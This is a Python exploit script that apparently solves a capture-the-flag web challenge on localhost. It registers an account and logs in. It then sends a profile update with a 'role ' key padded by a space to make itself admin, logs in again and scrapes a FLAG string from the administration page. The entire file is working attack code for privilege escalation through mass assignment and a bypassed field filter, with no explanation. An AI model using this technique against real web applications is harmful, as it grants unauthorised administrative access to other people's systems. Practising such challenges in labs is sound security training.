#!/usr/bin/env python3
import requests

# Target website
target = 'http://127.0.0.1:1337'

# User be used
user = {
	"username": "farsight",
	"school": "farsight",
	"password": "farsight"
}

# Setup session
session = requests.Session()

# Step 1: Register
print('[STEP 1] Registering ... ', end ='')
session.post(f"{target}/api/auth/register", json=user)
print('OK')

# Step 2: Login and save cookie
print('[STEP 2] Logging in ... ', end ='')
session.post(f"{target}/api/auth/login", json=user)
print('OK')

# Step 3: Send payload
payload = {
	"currentPassword": user['password'],
	"updates": {
		"role ": "admin"
	}
}
print('[STEP 3] Exploiting ... ', end ='')
session.put(f"{target}/api/auth/update", json=payload)
print('OK')

# Step 4: Re-login and save new cookie
print('[STEP 4] Reloading session cookie ... ', end ='')
session.post(f"{target}/api/auth/login", json=user)
print('OK')

# Step 5: Access administration and parse response
print('[STEP 5] Accessing admin panel ... ', end ='')
response = session.get(f"{target}/administration")
print('OK')

secret_message_starts = response.text.index('<p>')
secret_message_ends = response.text.index('</p>', secret_message_starts)
secret_message = response.text[secret_message_starts + 3 : secret_message_ends].strip()

if (secret_message.startswith("FLAG")):
	print('[SUCCESS] ' + secret_message)
else:
	print('[FAILED] Couldn\'t retrieve flag')
